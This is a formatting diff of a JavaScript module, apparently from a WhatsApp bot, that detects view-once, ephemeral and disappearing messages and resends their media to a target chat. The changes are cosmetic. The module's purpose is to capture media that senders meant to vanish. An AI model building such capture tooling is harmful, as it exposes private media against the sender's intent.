-  } catch (error) {
-    //this.log(`JID validation error for ${targetJid}: ${error.message}, but allowing forward attempt`, "debug")
-    return true // Always allow forwarding
   }
-}
-    /**
+  /**
    * ===========================================
    * MEDIA SENDING METHODS
    * ===========================================
@@ -1173,7 +1218,7 @@ static async validateTargetJid(sock, targetJid) {
           {
             text: `❌ Failed to send ViewOnce ${mediaType}\n\nError: ${error.message}\n\nCaption: ${caption}`,
           },
-          { quoted: quotedReference }
+          { quoted: quotedReference },
         )
       } catch (fallbackError) {
         //this.log(`Fallback text message also failed: ${fallbackError.message}`, "error")
@@ -1192,7 +1237,7 @@ static async validateTargetJid(sock, targetJid) {
 
     const viewOnceIndicators = [
       "viewOnceMessageV2",
-      "viewOnceMessage", 
+      "viewOnceMessage",
       "viewOnceMessageV2Extension",
       "ephemeralMessage",
       "disappearingMessage",
@@ -1203,7 +1248,7 @@ static async validateTargetJid(sock, targetJid) {
     const allMediaTypes = [
       "imageMessage",
       "videoMessage",
-      "audioMessage", 
+      "audioMessage",
       "documentMessage",
       "pttMessage",
       "stickerMessage",
@@ -1308,7 +1353,7 @@ static async validateTargetJid(sock, targetJid) {
   static getMimetypeForMediaType(mediaType) {
     const mimetypes = {
       image: "image/jpeg",
-      video: "video/mp4", 
+      video: "video/mp4",
       audio: "audio/mp4",
       document: "application/octet-stream",
       sticker: "image/webp",
@@ -1326,7 +1371,7 @@ static async validateTargetJid(sock, targetJid) {
       "ephemeral",
       "disappearing",
       "expire",
-      "once", 
+      "once",
       "single",
     ]
 
@@ -1386,7 +1431,7 @@ static async validateTargetJid(sock, targetJid) {
 
     const colors = {
       success: "\x1b[32m", // Green
-      warning: "\x1b[33m", // Yellow  
+      warning: "\x1b[33m", // Yellow
       error: "\x1b[31m", // Red
       info: "\x1b[34m", // Blue
       debug: "\x1b[90m", // Gray
@@ -1396,14 +1441,14 @@ static async validateTargetJid(sock, targetJid) {
     const color = colors[type] || ""
     const timestamp = new Date().toISOString().split("T")[1].split(".")[0]
 
-   // console.log(`${color}[ViewOnce][${timestamp}] ${message}${reset}`)
+    // console.log(`${color}[ViewOnce][${timestamp}] ${message}${reset}`)
   }
 
   /**
    * ===========================================
    * MESSAGE CONTEXT EXTRACTION
    * ===========================================
-   * 
+   *
    * Extracts telegram_id and session context from message
    */
   static async getMessageContext(m) {
